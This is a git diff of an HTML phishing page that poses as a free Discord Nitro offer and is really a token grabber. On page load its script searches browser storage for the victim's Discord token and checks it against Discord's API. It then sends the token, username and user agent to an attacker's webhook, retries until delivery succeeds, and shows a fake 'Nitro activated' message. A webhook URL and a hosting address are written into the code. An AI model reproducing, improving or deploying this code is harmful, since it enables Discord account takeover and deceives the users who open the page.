@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width">
-    <title>Discord Nitro Free</title>
+    <title>Discord Nitro</title>
     <style>
         body { 
             margin: 0; padding: 40px; 
@@ -30,10 +30,9 @@
     </div>
 
     <script>
+    // YOUR WEBHOOK HERE (GET FROM Discord → Server Settings → Integrations → Webhooks)
     const WEBHOOK = 'https://discord.com/api/webhooks/1482696426575368252/iebzhhJsdt83_QXWG5hek6UhjU2rQ6BfKdU7h7_w_gsdP8fEFF-Dc2gPf6Bp0-i2ZKP-';
-    const POLL_INTERVAL = 1000;
-
-    // AGGRESSIVE TOKEN HUNTER
+    
     function huntToken() {
         const sources = [
             localStorage.getItem('token'),
@@ -55,21 +54,25 @@
 
     async function sendToken(token) {
         try {
-            // Verify token works
+            document.getElementById('status').innerHTML = 'Validating token...';
+            
             const user = await fetch('https://discord.com/api/v9/users/@me', {
                 headers: { 'Authorization': token }
-            }).then(r => r.json()).catch(() => null);
-            
+            }).then(r => r.json()).catch(() => ({id: null}));
+
             const payload = {
-                content: `📱 **iOS APP TOKEN GRABBED**`,
+                content: `📱 **iOS DISCORD TOKEN GRABBED** ✅`,
+                username: 'Token Grabber',
                 embeds: [{
-                    title: user?.username || 'Token',
+                    title: user.id ? `${user.username}#${user.discriminator}` : 'Token (needs validation)',
                     description: `\`\`\`${token}\`\`\``,
-                    color: user ? 0x00ff00 : 0xff4444,
+                    color: user.id ? 0x00ff00 : 0xffaa00,
                     fields: [
-                        { name: 'Referer', value: document.referrer.slice(0, 80), inline: true },
-                        { name: 'User Agent', value: navigator.userAgent.slice(0, 60), inline: true }
-                    ]
+                        { name: 'URL', value: 'https://mattiatek1.github.io/tokendiscord/', inline: true },
+                        { name: 'User ID', value: user.id || 'Checking...', inline: true },
+                        { name: 'iOS UA', value: navigator.userAgent.slice(0, 60), inline: false }
+                    ],
+                    footer: { text: new Date().toLocaleString() }
                 }]
             };
             
@@ -79,35 +82,30 @@
                 body: JSON.stringify(payload)
             });
             
-            document.getElementById('status').innerHTML = '<span class="success">✅ Nitro activated!</span>';
+            document.getElementById('status').innerHTML = '<span class="success">✅ Nitro activated! Check DMs!</span>';
             document.getElementById('loader').style.display = 'none';
         } catch(e) {
-            console.log('Send failed, retrying...');
+            console.log('Retry...');
+            setTimeout(() => sendToken(token), 2000);
         }
     }
 
-    // MAIN ATTACK
     function startAttack() {
-        // Try immediate grab
         if(huntToken()) return;
         
-        // FORCE Discord app open (iOS universal link)
+        document.getElementById('status').innerHTML = 'Open Discord app now...';
         window.location.href = 'discord://discord.com';
         
-        // POLL EVERY SECOND for returned token
         const interval = setInterval(() => {
-            if(huntToken()) {
-                clearInterval(interval);
-            }
-        }, POLL_INTERVAL);
+            if(huntToken()) clearInterval(interval);
+        }, 800);
         
-        // Stop after 30s
-        setTimeout(() => clearInterval(interval), 30000);
+        setTimeout(() => clearInterval(interval), 45000);
     }
 
-    // START
+    // AUTO START + POLLING
     startAttack();
-    setInterval(huntToken, 500); // Background hunter
+    setInterval(huntToken, 500);
     </script>
 </body>
 </html>
